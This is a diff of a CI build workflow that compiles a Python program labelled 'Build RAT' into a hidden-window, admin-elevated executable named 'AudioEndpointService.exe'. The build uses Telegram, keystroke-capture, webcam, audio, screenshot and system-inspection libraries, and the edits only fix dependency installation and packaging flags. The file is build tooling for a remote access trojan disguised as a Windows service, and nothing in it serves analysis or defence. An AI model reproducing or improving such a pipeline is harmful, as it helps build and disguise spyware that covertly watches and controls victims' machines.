@@ -16,16 +16,20 @@ jobs:
       with:
         python-version: '3.11'
     
-    - name: Install dependencies
+    - name: Fix Python environment
       run: |
         python -m pip install --upgrade pip
-        pip install pyinstaller
+        pip install --upgrade setuptools wheel
+        pip install pyinstaller --upgrade
+    
+    - name: Install dependencies
+      run: |
         pip install python-telegram-bot pillow opencv-python pynput cryptography pywin32 pyaudio requests psutil wmi pyautogui numpy
         pip install --no-cache-dir --force-reinstall python-telegram-bot
 
     - name: Build RAT
       run: |
-        pyinstaller --onefile --noconsole --hidden-import=python_telegram_bot --hidden-import=telegram --hidden-import=requests --hidden-import=pillow --hidden-import=cv2 --uac-admin tat.py --name AudioEndpointService.exe
+        pyinstaller --onefile --noconsole --hidden-import=python_telegram_bot --hidden-import=telegram --hidden-import=requests --hidden-import=pillow --hidden-import=cv2 --collect-all python_telegram_bot --collect-all telegram --uac-admin tat.py --name AudioEndpointService.exe
 
     - name: Build Setup
       run: |
